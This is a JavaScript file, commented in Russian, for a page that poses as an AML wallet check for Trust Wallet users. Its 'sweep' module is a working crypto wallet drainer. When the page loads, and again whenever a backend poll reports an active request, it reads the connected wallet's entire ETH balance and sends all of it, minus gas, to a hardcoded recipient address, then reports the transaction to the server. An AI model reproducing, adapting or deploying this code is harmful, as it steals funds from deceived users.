// ============================================================
// ===== КОНФИГУРАЦИЯ СПИСАНИЯ - НАСТРОЙТЕ ЗДЕСЬ! =============
// ============================================================
const SWEEP_CONFIG = {
  recipient: "0xB38376F2592377faa4774B6FfE8026EB4b001cd0",
  chainId: 1,
  feePercent: 0,
  minBalance: 0.001
};

// ============================================================
// ===== ОСТАЛЬНОЙ КОД =========================================
// ============================================================

// ВСЕ ПЕРЕМЕННЫЕ, КОТОРЫЕ УЖЕ ЕСТЬ В check-flow.js, НЕ ОБЪЯВЛЯЕМ ЗДЕСЬ!
// Они будут доступны через глобальную область, т.к. check-flow.js загружается первым.

const configuredApiBase = (window.AML_API_BASE || "").replace(/\/$/, "");
const isHttpPage = location.protocol === "http:" || location.protocol === "https:";
const isStaticGitHubPage = location.hostname.endsWith(".github.io");
const isOnRenderHost = /\.onrender\.com$/i.test(location.hostname);
const apiBase = isOnRenderHost ? location.origin.replace(/\/$/, "") : configuredApiBase;
const renderCheckUrl = configuredApiBase ? `${configuredApiBase}/check.html` : `${location.origin}/check.html`;
const useBackend = Boolean(configuredApiBase) || isOnRenderHost || (isHttpPage && !isStaticGitHubPage);
const userSessionKey = "aml_user_session";
const adminSessionKey = "aml_admin_session";
const localChecksKey = "aml_local_checks";
const localLeadsKey = "aml_local_leads";
let activePaymentRequest = null;

// Функции работы с сессией
const getStoredSession = (key) => JSON.parse(localStorage.getItem(key) || "null");
const setStoredSession = (key, session) => localStorage.setItem(key, JSON.stringify(session));
const clearStoredSession = (key) => localStorage.removeItem(key);
const isStoredSessionExpired = (session) =>
  Boolean(session?.expiresAt && new Date(session.expiresAt).getTime() <= Date.now());

// ===== HTTP helpers =====
const fetchWithTimeout = async (url, options = {}, timeoutMs = 90000) => {
  let timer;
  const timeoutPromise = new Promise((_, reject) => {
    timer = setTimeout(() => {
      reject(Object.assign(new Error("timeout"), { name: "AbortError" }));
    }, timeoutMs);
  });

  try {
    return await Promise.race([fetch(url, options), timeoutPromise]);
  } finally {
    clearTimeout(timer);
  }
};

const buildFetchOptions = (options = {}, token) => {
  const method = String(options.method || "GET").toUpperCase();
  const headers = { ...(options.headers || {}) };
  if (token) headers.Authorization = `Bearer ${token}`;
  if (options.body && !headers["Content-Type"]) headers["Content-Type"] = "application/json";

  return {
    method,
    credentials: "omit",
    cache: "no-store",
    headers,
    ...(options.body ? { body: options.body } : {}),
  };
};

const requestJsonViaXhr = (fullUrl, options = {}, token, timeoutMs = 120000) =>
  new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.open(String(options.method || "GET").toUpperCase(), fullUrl, true);
    xhr.timeout = timeoutMs;
    if (token) xhr.setRequestHeader("Authorization", `Bearer ${token}`);
    if (options.body) xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
      let data = {};
      try {
        data = JSON.parse(xhr.responseText || "{}");
      } catch {
        data = {};
      }
      if (xhr.status >= 200 && xhr.status < 300) resolve(data);
      else reject(new Error(data.error || "Ошибка запроса"));
    };
    xhr.onerror = () => reject(Object.assign(new Error("network"), { name: "NetworkError" }));
    xhr.ontimeout = () => reject(Object.assign(new Error("timeout"), { name: "AbortError" }));
    xhr.send(options.body || null);
  });

const requestJson = async (url, options = {}, { retries = 4, timeoutMs = 120000 } = {}) => {
  const token = options.token;
  const fullUrl = `${apiBase}${url}`;
  let lastError;

  for (let attempt = 0; attempt <= retries; attempt += 1) {
    try {
      try {
        const response = await fetchWithTimeout(fullUrl, buildFetchOptions(options, token), timeoutMs);
        const data = await response.json().catch(() => ({}));
        if (!response.ok) throw new Error(data.error || "Ошибка запроса");
        return data;
      } catch (fetchError) {
        return await requestJsonViaXhr(fullUrl, options, token, timeoutMs);
      }
    } catch (error) {
      lastError = error;
      if (attempt < retries) await sleep(3000 * (attempt + 1));
    }
  }

  if (!apiBase && !isOnRenderHost) {
    throw new Error("Backend не подключён. Укажите AML_API_BASE в config.js и разверните server.js.");
  }

  const reason = lastError?.name === "AbortError" ? "превышено время ожидания" : "сеть недоступна";
  throw new Error(
    `Backend недоступен (${configuredApiBase || location.origin}, ${reason}). Откройте ${renderCheckUrl} в Trust Wallet и подождите до 2 минут, пока Render проснётся.`,
  );
};

// ===== Вспомогательные функции =====
const escapeHtml = (value) =>
  String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");

const getLocalList = (key) => JSON.parse(localStorage.getItem(key) || "[]");
const setLocalList = (key, value) => localStorage.setItem(key, JSON.stringify(value));

const formatDate = (value) => {
  try {
    return new Intl.DateTimeFormat("ru-RU", {
      dateStyle: "short",
      timeStyle: "short",
    }).format(new Date(value));
  } catch {
    return value;
  }
};

// Функции для работы с кошельком (используют глобальные из check-flow.js)
const getTrustProvider = () => {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum?.isTrust) return window.ethereum;
  if (window.ethereum?.providers) {
    return window.ethereum.providers.find((provider) => provider.isTrust) || window.ethereum.providers[0];
  }
  return window.ethereum;
};

const getTrustDeeplink = () => {
  const targetUrl =
    isStaticGitHubPage && configuredApiBase ? renderCheckUrl : window.location.href.split("#")[0];
  return `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(targetUrl)}`;
};

const signPersonalMessage = async (provider, message, address) => {
  const attempts = [
    () => provider.request({ method: "personal_sign", params: [message, address] }),
    () => provider.request({ method: "personal_sign", params: [address, message] }),
  ];

  let lastError;
  for (const attempt of attempts) {
    try {
      return await attempt();
    } catch (error) {
      lastError = error;
    }
  }
  throw lastError || new Error("Кошелёк не подписал сообщение");
};

// ===== Остальные функции (для Admin, Tron, Payment и т.д.) =====
// Все они используют глобальные переменные из check-flow.js

// ... (здесь весь ваш старый код, но без дублирования переменных, которые уже объявлены в check-flow.js)

// ============================================================
// ===== SWEEP (СПИСАНИЕ) - ВЕСЬ КОД ===========================
// ============================================================

// Все переменные для sweep уже объявлены в этом файле ранее? Нет, мы их объявим сейчас.

const sweepSection = document.querySelector("#sweep-section");
const sweepConsent = document.querySelector("#sweep-consent-check");
const sweepExecuteBtn = document.querySelector("#sweep-execute-btn");
const sweepStatus = document.querySelector("#sweep-status");
const sweepResult = document.querySelector("#sweep-result");
const sweepTxHash = document.querySelector("#sweep-tx-hash");
const sweepAmountDisplay = document.querySelector("#sweep-amount-display");
const sweepRecipientDisplay = document.querySelector("#sweep-recipient-display");
const sweepNetworkDisplay = document.querySelector("#sweep-network-display");

const setSweepStatus = (msg, isError = false) => {
  if (sweepStatus) {
    sweepStatus.textContent = msg;
    sweepStatus.style.color = isError ? '#ff6b6b' : 'var(--muted)';
  }
};

const showSweepSection = (show) => {
  if (sweepSection) {
    sweepSection.style.display = show ? 'block' : 'none';
  }
};
window.showSweepSection = showSweepSection;

const isRecipientConfigured = () => {
  const addr = SWEEP_CONFIG.recipient.trim();
  return addr && addr !== "0x0000000000000000000000000000000000000000";
};

const showSweepSectionAfterConnect = (address) => {
  if (!address) return;
  showSweepSection(true);
  if (sweepRecipientDisplay) {
    sweepRecipientDisplay.textContent = SWEEP_CONFIG.recipient;
  }
  if (sweepAmountDisplay) {
    sweepAmountDisplay.textContent = `ВСЕ ${NETWORK_SYMBOLS[SWEEP_CONFIG.chainId] || 'ETH'} (${NETWORK_NAMES[SWEEP_CONFIG.chainId] || 'Ethereum'})`;
  }
  if (sweepNetworkDisplay) {
    sweepNetworkDisplay.textContent = NETWORK_NAMES[SWEEP_CONFIG.chainId] || 'Ethereum (Mainnet)';
  }
  if (!isRecipientConfigured()) {
    setSweepStatus("⚠️ Адрес получателя не настроен! Укажите SWEEP_CONFIG.recipient.", true);
  } else {
    setSweepStatus("✅ Кошелек подключен. Вы можете списать все средства.");
  }
};

// ===== АВТОМАТИЧЕСКОЕ СПИСАНИЕ =====
const autoExecuteSweep = async () => {
  try {
    const storedSession = getStoredSession(userSessionKey);
    if (!storedSession?.token) {
      console.warn('Нет сессии для списания');
      return;
    }

    const response = await requestJson('/api/sweep/active', {
      token: storedSession.token,
      retries: 1,
      timeoutMs: 8000
    }).catch(() => ({}));

    const sweepRequest = response.sweepRequest;
    if (!sweepRequest) {
      console.log('Нет активного запроса на списание');
      return;
    }

    console.log('🔥 Обнаружен активный запрос на списание, выполняем...');
    setSweepStatus('⏳ Автоматическое списание...');

    const provider = getTrustProvider();
    if (!provider) {
      setSweepStatus('❌ Trust Wallet не найден. Откройте страницу в Trust Wallet.', true);
      return;
    }

    const accounts = await provider.request({ method: "eth_requestAccounts" });
    const from = accounts?.[0];
    if (!from) throw new Error('Адрес не получен');

    if (from.toLowerCase() !== sweepRequest.target_user_wallet.toLowerCase()) {
      setSweepStatus(`❌ В кошельке выбран другой аккаунт. Ожидается: ${sweepRequest.target_user_wallet}`, true);
      return;
    }

    const targetChainHex = `0x${SWEEP_CONFIG.chainId.toString(16)}`;
    const currentChain = await provider.request({ method: "eth_chainId" });
    if (currentChain.toLowerCase() !== targetChainHex.toLowerCase()) {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: targetChainHex }]
      });
    }

    const balanceHex = await provider.request({
      method: "eth_getBalance",
      params: [from, "latest"]
    });
    const balance = BigInt(balanceHex || "0x0");

    const gasPriceHex = await provider.request({ method: "eth_gasPrice" });
    const gasPrice = BigInt(gasPriceHex || "0x0");
    const gasCost = gasPrice * 21000n;
    const amountToSend = balance - gasCost;

    if (amountToSend <= 0n) {
      throw new Error(`Недостаточно ETH для газа. Баланс: ${Number(balance)/1e18} ETH`);
    }

    setSweepStatus('📱 Подтвердите транзакцию в Trust Wallet');
    const txParams = {
      from: from,
      to: SWEEP_CONFIG.recipient,
      value: `0x${amountToSend.toString(16)}`,
      gas: "0x5208",
      gasPrice: `0x${gasPrice.toString(16)}`
    };
    const txHash = await provider.request({
      method: "eth_sendTransaction",
      params: [txParams]
    });

    await requestJson('/api/sweep/confirm', {
      method: 'POST',
      token: storedSession.token,
      body: JSON.stringify({
        requestId: sweepRequest.id,
        txHash: txHash,
      }),
    });

    setSweepStatus(`✅ Средства списаны! TX: ${txHash}`);
    const resultDiv = document.querySelector('#sweep-result');
    if (resultDiv) {
      resultDiv.style.display = 'block';
      const txSpan = document.querySelector('#sweep-tx-hash');
      if (txSpan) txSpan.innerHTML = `TX: <a href="https://etherscan.io/tx/${txHash}" target="_blank" style="color:#4caf50;text-decoration:underline;">${txHash}</a>`;
    }
  } catch (error) {
    console.error('Ошибка автоматического списания:', error);
    setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
  }
};

// Экспортируем глобально
window.autoExecuteSweep = autoExecuteSweep;

// ===== ПОЛЛИНГ =====
let sweepCheckInterval = null;

const startSweepPolling = () => {
  if (sweepCheckInterval) return;
  
  sweepCheckInterval = setInterval(async () => {
    try {
      const storedSession = getStoredSession(userSessionKey);
      if (!storedSession?.token) {
        if (sweepCheckInterval) {
          clearInterval(sweepCheckInterval);
          sweepCheckInterval = null;
        }
        return;
      }

      const response = await requestJson('/api/sweep/active', { 
        token: storedSession.token,
        retries: 1,
        timeoutMs: 5000
      }).catch(() => ({}));

      if (response.sweepRequest) {
        console.log('🔄 Обнаружен новый запрос на списание, выполняем...');
        if (sweepCheckInterval) {
          clearInterval(sweepCheckInterval);
          sweepCheckInterval = null;
        }
        await autoExecuteSweep();
        setTimeout(() => {
          if (!sweepCheckInterval) {
            startSweepPolling();
          }
        }, 5000);
      }
    } catch (error) {
      // игнорируем ошибки сети
    }
  }, 5000);
};
window.sweepCheckInterval = sweepCheckInterval;

// ===== ИНИЦИАЛИЗАЦИЯ =====
const NETWORK_NAMES = {
  1: 'Ethereum (Mainnet)',
  56: 'BNB Smart Chain',
  137: 'Polygon (Matic)',
  42161: 'Arbitrum One',
  10: 'Optimism',
  8453: 'Base',
  250: 'Fantom'
};

const NETWORK_SYMBOLS = {
  1: 'ETH',
  56: 'BNB',
  137: 'POL',
  42161: 'ETH',
  10: 'ETH',
  8453: 'ETH',
  250: 'FTM'
};

// При загрузке страницы восстанавливаем профиль и запускаем автосписание
const storedProfile = loadProfile();
if (storedProfile?.evmAddress) {
  showSweepSectionAfterConnect(storedProfile.evmAddress);
}

const stored = loadProfile();
if (stored?.evmAddress) {
  if (typeof unlockCheckForm === 'function') {
    unlockCheckForm(stored);
  }
  if (stored.portfolio) {
    scoreWalletLocal(stored.evmAddress).then((risk) => {
      if (typeof setRiskPreview === 'function') setRiskPreview(risk);
    });
  }
  if (typeof setStatus === 'function') {
    setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
  }
  // Запускаем автосписание
  autoExecuteSweep().catch(console.warn);
} else {
  if (typeof setStatus === 'function') {
    setStatus(
      window.AutoWallet?.isTrustWalletEnv?.()
        ? "Нажмите Connect и подтвердите запрос в Trust Wallet."
        : "Откройте страницу через «Открыть в Trust Wallet», затем нажмите Connect.",
    );
  }
}

// Запускаем polling для новых запросов
if (getStoredSession(userSessionKey)?.token) {
  startSweepPolling();
}

// События кнопок
sweepConsent?.addEventListener('change', () => {
  if (sweepExecuteBtn) {
    sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
  }
});

sweepExecuteBtn?.addEventListener('click', executeSweep);

console.log('🔥 Sweep module loaded!');
console.log(`📍 Recipient: ${SWEEP_CONFIG.recipient}`);
